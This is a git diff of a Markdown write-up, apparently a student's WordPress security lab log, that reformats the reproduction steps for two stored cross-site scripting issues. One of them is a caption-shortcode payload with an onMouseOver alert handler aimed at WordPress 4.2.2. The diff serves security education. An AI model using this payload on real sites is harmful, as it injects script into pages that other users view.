@@ -71,7 +71,7 @@ Time spent: 10 hours spent in total
    - 1. Log into WP as admin
    - 2. Create a new post
    - 3. Edit as text and put: 
- 	- -<img src=xss-newpost.png />
+    - <img src=xss-newpost.png />
 - [ ] Affected source code:
   - [Affected source code](https://core.trac.wordpress.org/changeset/33359)
 - [ ] References:
@@ -152,7 +152,8 @@ or HTML when creating or editing pages or posts.
    - 1. Log into WP as admin
    - 2. Create a new post
    - 3. Edit as text and put the following: 
-	Wanna A Suprise!!![caption width="2" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(12345678910)'">CLICK ME!</a>
+	Wanna A Suprise!!![caption width="2" caption='<a href="' ">]</a>
+	<a href="http://onMouseOver='alert(12345678910)'">CLICK ME!</a>
    
 - [ ] Affected source code:
   - [Affected source code](https://core.trac.wordpress.org/browser/tags/4.2.2/src/wp-includes/shortcodes.php)
